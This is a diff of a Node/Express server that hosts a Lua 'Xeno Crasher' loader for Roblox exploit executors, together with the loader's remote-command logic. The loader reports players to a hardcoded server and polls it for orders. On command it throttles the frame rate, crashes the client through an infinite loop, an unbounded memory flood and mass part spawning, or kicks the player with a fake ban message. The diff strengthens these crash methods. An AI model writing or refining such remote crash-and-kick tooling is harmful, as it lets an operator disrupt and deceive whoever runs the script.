@@ -5,9 +5,6 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ============================================
-// USE YOUR ACTUAL RAILWAY URL
-// ============================================
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://crasherscript-production.up.railway.app';
 
 app.use(cors({
@@ -20,17 +17,17 @@ app.use(express.json({ limit: '10mb' }));
 const players = new Map();
 
 // ============================================
-// LOADER SCRIPT - Served to Roblox clients
+// LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher Client ]]--
+    const loader = `--[[ Xeno Crasher Client v2 ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY  = "xenooooo"
 
 -- ============================================
 -- HTTP REQUEST DETECTION
 -- ============================================
-local function resolveRequest()
+local function findHttpFunction()
     local functions = {
         syn and syn.request,
         request,
@@ -38,6 +35,8 @@ local function resolveRequest()
         http_request,
         fluxus and fluxus.request,
         getgenv and getgenv().request,
+        getrenv and getrenv().request,
+        shared and shared.request,
         function(url, options)
             return game:GetService("HttpService"):PostAsync(
                 url,
@@ -55,7 +54,7 @@ local function resolveRequest()
     return nil
 end
 
-local request = resolveRequest()
+local request = findHttpFunction()
 if not request then
     error("❌ No HTTP function found!")
 end
@@ -78,7 +77,7 @@ local function safe(fn)
 end
 
 -- ============================================
--- GUI CREATION
+-- GUI
 -- ============================================
 local function createGUI()
     local screenGui = Instance.new("ScreenGui")
@@ -107,8 +106,10 @@ local function createGUI()
     return screenGui
 end
 
+createGUI()
+
 -- ============================================
--- HEARTBEAT - Sends data to server
+-- HEARTBEAT
 -- ============================================
 local function heartbeat()
     safe(function()
@@ -130,56 +131,68 @@ local function heartbeat()
 end
 
 -- ============================================
--- FPS LIMIT FUNCTION (with custom FPS)
+-- FPS LIMIT
 -- ============================================
 local fpsConnection = nil
-local fpsTarget = nil
+local fpsActive = false
 
 local function setFPSLimit(targetFPS)
+    print("🎯 Setting FPS to: " .. tostring(targetFPS))
+    
     if fpsConnection then
         fpsConnection:Disconnect()
         fpsConnection = nil
+        fpsActive = false
     end
     
     if not targetFPS or targetFPS <= 0 then
+        print("✅ FPS limit disabled")
         return
     end
     
-    fpsTarget = targetFPS
+    fpsActive = true
     local frameTime = 1 / targetFPS
     
     fpsConnection = RunService.RenderStepped:Connect(function()
         local startTime = tick()
-        while tick() - startTime < frameTime do
+        while tick() - startTime < frameTime and fpsActive do
             -- Busy loop to cap FPS
         end
     end)
 end
 
 -- ============================================
--- POLL - Checks for commands from website
+-- POLL - RECEIVES COMMANDS
 -- ============================================
 local function poll()
     safe(function()
-        local res = request({
-            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
-            Method = "GET",
-            Headers = { ["X-Api-Key"] = KEY },
-        })
+        local success, result = pcall(function()
+            return request({
+                Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
+                Method = "GET",
+                Headers = { ["X-Api-Key"] = KEY },
+            })
+        end)
         
-        if res and res.Body then
-            local data = HttpService:JSONDecode(res.Body)
+        if success and result and result.Body then
+            local data = HttpService:JSONDecode(result.Body)
+            print("📥 Received: " .. HttpService:JSONEncode(data))
             
             -- FPS LIMIT
             if data.fps_limit then
-                local targetFPS = tonumber(data.fps_limit) or 10
-                setFPSLimit(targetFPS)
-            else
-                setFPSLimit(nil)
+                local targetFPS = tonumber(data.fps_limit)
+                if targetFPS and targetFPS > 0 then
+                    setFPSLimit(targetFPS)
+                else
+                    setFPSLimit(nil)
+                end
             end
             
-            -- CRASH COMMAND
+            -- CRASH
             if data.crash == true then
+                print("💥 CRASH COMMAND RECEIVED!")
+                
+                -- Method 1: Infinite loop
                 task.spawn(function()
                     while true do
                         local x = 0
@@ -188,12 +201,19 @@ local function poll()
                         end
                     end
                 end)
+                
+                -- Method 2: Memory flood
                 task.spawn(function()
-                    local huge = {}
-                    for i = 1, 1000000 do
-                        huge[i] = string.rep("X", 10000)
+                    local t = {}
+                    while true do
+                        for i = 1, 1000 do
+                            t[#t + 1] = string.rep("X", 50000)
+                        end
+                        task.wait()
                     end
                 end)
+                
+                -- Method 3: Part spam
                 task.spawn(function()
                     for i = 1, 5000 do
                         local p = Instance.new("Part")
@@ -204,13 +224,15 @@ local function poll()
                             math.random(-1000, 1000),
                             math.random(-1000, 1000)
                         )
-                        task.wait()
+                        task.wait(0.01)
                     end
                 end)
             end
             
-            -- KICK COMMAND
+            -- KICK
             if data.kick == true then
+                print("👢 KICK COMMAND RECEIVED!")
+                task.wait(0.5)
                 LP:Kick("You have been banned.")
             end
         end
@@ -218,9 +240,8 @@ local function poll()
 end
 
 -- ============================================
--- START THE SCRIPT
+-- START
 -- ============================================
-createGUI()
 heartbeat()
 poll()
 
@@ -232,7 +253,9 @@ task.spawn(function()
     while task.wait(0.5) do poll() end
 end)
 
-print("✅ Xeno Crasher loaded successfully!");
+print("✅ Xeno Crasher loaded successfully!")
+print("🔗 Connected to: " .. BASE)
+print("👤 Player: " .. LP.Name)
 `;
 
     res.setHeader('Content-Type', 'text/plain');
@@ -259,6 +282,7 @@ app.post('/api/public/heartbeat', (req, res) => {
         lastHeartbeat: Date.now()
     });
     
+    console.log(`❤️ Heartbeat from: ${data.username || userId}`);
     res.json({ status: 'ok' });
 });
 
@@ -313,6 +337,7 @@ app.get('/api/public/command', (req, res) => {
     
     if (p.fps_limit) {
         response.fps_limit = p.fps_limit;
+        p.fps_limit = false;
     }
     if (p._crash) {
         response.crash = true;
@@ -338,6 +363,6 @@ app.get('/', (req, res) => {
 // START SERVER
 // ============================================
 app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 Xeno Crasher Server running on port ${PORT}`);
     console.log(`📍 Public URL: ${PUBLIC_URL}`);
 });
